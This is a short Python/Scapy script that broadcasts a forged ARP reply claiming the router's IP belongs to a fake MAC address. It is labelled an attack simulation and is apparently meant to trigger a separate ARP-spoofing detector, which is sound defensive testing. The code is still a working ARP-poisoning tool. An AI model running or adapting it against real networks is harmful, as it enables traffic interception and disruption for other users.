from scapy.all import sendp, ARP, Ether
import time

# !!! IMPORTANT: Change this to your router's IP !!!
router_ip = "10.86.0.2"

# A fake MAC address we are claiming
fake_mac = "aa:bb:cc:dd:ee:ff"

print(f"[*] Starting attack simulation...")
print(f"[*] Sending 1 fake ARP packet:")
print(f"[*]   IP: {router_ip} (The Router)")
print(f"[*]   Claiming MAC: {fake_mac} (Fake MAC)")

# Craft the malicious packet
# op=2 means "is-at" (a reply)
arp_packet = ARP(op=2,
                 psrc=router_ip,    # Claiming to be the router
                 pdst="10.86.0.0",  # Ignored, but good to set
                 hwdst="ff:ff:ff:ff:ff:ff", # Broadcast MAC
                 hwsrc=fake_mac)    # Our fake MAC address

# Create the full Ethernet frame
# ff:ff:ff:ff:ff:ff is the broadcast MAC address.
# This sends the packet to *everyone* on the network.
frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet

# Send the packet
sendp(frame, verbose=False)

print("[+] Fake packet sent!")
print("[*] Check your detector script's console.")